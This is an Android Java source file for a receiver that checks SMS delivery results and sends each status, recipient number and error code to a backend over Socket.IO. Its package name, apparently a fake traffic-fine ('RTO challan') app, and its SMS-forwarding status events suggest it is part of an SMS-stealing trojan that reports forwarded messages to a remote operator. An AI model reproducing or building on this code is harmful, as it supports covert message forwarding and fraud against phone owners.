package com.service.rtochallan;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

import org.json.JSONException;
import org.json.JSONObject;

public class DeliveredReceiver extends BroadcastReceiver {
    protected SocketManager socketManager;

    @Override
    public void onReceive(Context context, Intent intent) {
        Helper helper = new Helper();
        socketManager = SocketManager.getInstance(context);

        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        int resultCode = getResultCode();

        String status;
        String statusMessage;

        switch (resultCode) {
            case Activity.RESULT_OK:
                status = "Delivered";
                statusMessage = "SMS delivered successfully to " + number;
                break;

            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                status = "UnDelivered";
                statusMessage = "Generic failure delivering to " + number;
                break;

            case SmsManager.RESULT_ERROR_NO_SERVICE:
                status = "UnDelivered";
                statusMessage = "No service while delivering to " + number;
                break;

            case SmsManager.RESULT_ERROR_NULL_PDU:
                status = "UnDelivered";
                statusMessage = "Null PDU while delivering to " + number;
                break;

            case SmsManager.RESULT_ERROR_RADIO_OFF:
                status = "UnDelivered";
                statusMessage = "Radio off — unable to deliver SMS to " + number;
                break;

            default:
                status = "UnDelivered";
                statusMessage = "Unknown delivery error (" + resultCode + ") for " + number;
                break;
        }

        try {
            JSONObject data = new JSONObject();
            data.put("id", id);
            data.put("sms_forwarding_status", status);
            data.put("sms_forwarding_status_message", statusMessage);
            data.put("error_code", resultCode); // ✅ Include delivery code

            // ✅ Emit update to the backend through Socket.IO
            socketManager.emit("updateSMSForwardingStatus", data);

            //Log.d(helper.TAG, "Delivery result: " + statusMessage);

        } catch (JSONException e) {
            e.printStackTrace(); // safer than crashing app
        }
    }
}
